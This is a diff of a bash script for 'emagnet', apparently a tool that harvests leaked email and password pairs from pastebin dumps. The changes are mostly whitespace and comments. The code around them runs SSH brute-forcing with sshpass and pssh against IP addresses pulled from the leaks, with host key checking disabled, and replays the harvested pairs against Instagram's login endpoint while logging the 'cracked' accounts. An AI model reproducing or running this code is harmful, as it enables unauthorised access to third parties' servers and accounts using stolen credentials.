@@ -400,8 +400,8 @@ TOTP="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # 
 TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls
           emagnet_clear;emagnet_banner
           printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
-	  printf "%64s \n\n" | tr ' ' '='
-	  LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
+	      printf "%64s \n\n" | tr ' ' '='
+	      LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
            for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
             echo -e ",-> Merging logs from: $LOGDATE \n|"
             logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-instagram-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
@@ -413,7 +413,7 @@ TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # 
                   printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
                   sleep 1
                 else
-	          printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
+	              printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
                   sleep 1
                 fi
                   done < $HOME/emagnet/.emagnet-temp-merge.txt
@@ -465,12 +465,12 @@ fi
     mkdir -p "$EMAGNETARCHIVE/logs"
   fi
         printf "%s" "Moving all incoming files to archive"
-                cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
+            cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
      		cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
     		cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
         printf "%s\n" "...done."
 
-      read -p "Wipe incoming directories (y/n): " cleanup
+ read -p "Wipe incoming directories (y/n): " cleanup
    if [[ "$cleanup" = "y" ]]; then
       rm -rf "$EMAGNET/incoming/"
       printf "\e[1;31mWiped\e[0m: $EMAGNET/incoming..\nDone..\n"
@@ -509,7 +509,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
-	    sed -i '125d' "$CONF"
+            sed -i '125d' "$CONF"
      	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
       	    sed -i '126d' "$CONF"
      	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
@@ -522,7 +522,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
-	    sed -i '125d' "$CONF"
+	        sed -i '125d' "$CONF"
      	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
       	    sed -i '126d' "$CONF"
      	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
@@ -565,7 +565,6 @@ if [[ -z "$SSHPASS" ]]; then
      fi
 fi
 
-# SKIPLIST - EDIT THIS IF YOU WANT TO SKIP MORE IP's
 SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
 grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
 |awk -F':' '{print $2}' \
@@ -583,45 +582,19 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         printf "\n%64s\n" | tr ' ' '='
         printf "\n%15s";printf "BRUTE FORCING \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
         sleep 2
-        # We can't send to log files due to pssh will crash with
-        # the message below when sending to stderr, we can use tee of course
-        # but it wont get perfect then, let us use the method below  for now
-        # If you are still not happy, then see my sample on
-        # github for using another tools while reading files
-        # ------------------------------------------------------------------------
-        # Traceback (most recent call last):
-        # File "/usr/bin/pssh", line 118, in <module>
-        # do_pssh(hosts, cmdline, opts)
-        # File "/usr/bin/pssh", line 89, in do_pssh
-        # statuses = manager.run()
-#       while read sshtargets; do
+        # Yep, it's without any logging due to a bug in pssh, be around if you using SSH bruteforce
          sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -A -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
-#		if [[ $? -eq "0" ]]; then
-#		    	echo -e "[\e[1;32m>>\e[0m] - Cracked $sshtargets: $SSHUSER:$SSHPASS"
-#    			echo -e "================================================================"        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-#                       echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"         >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-#	                echo -e "[+]------------------------------------------------------------"         >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-#			echo -e "[+] Username: $SSHUSER"                                                  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-#    			echo -e "[+] Password: $SSHPASS"                                                  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-#    			echo -e "================================================================\n\n"    >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-#		  else
-#                       echo -e "[\e[1;31m<<\e[0m] - Wrong Password For $sshtargets: $SSHUSER:$SSHPASS"
-#                       echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS " >> $EMAGNETLOGS/failed-2-crack.txt
-#		fi
-	#    done < $SSHTARGETS
-fi
+   fi
     		sleep 4
 }
 
 emagnet_instagrambruter() {
 URL="https://www.instagram.com/accounts/login/ajax/?hl=jp"
- 
-     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt   
-
 while read instagramlogin; do
     INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1,2|sed 's/:/\&password\=/g')"
     INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
@@ -645,7 +618,7 @@ while read instagramlogin; do
  fi
 done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
          printf "%64s \n\n" | tr ' ' '='
-         echo -e "- Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
+     #    echo -e "- Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
          sleep 3
          rm "$HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt"
          sleep 0
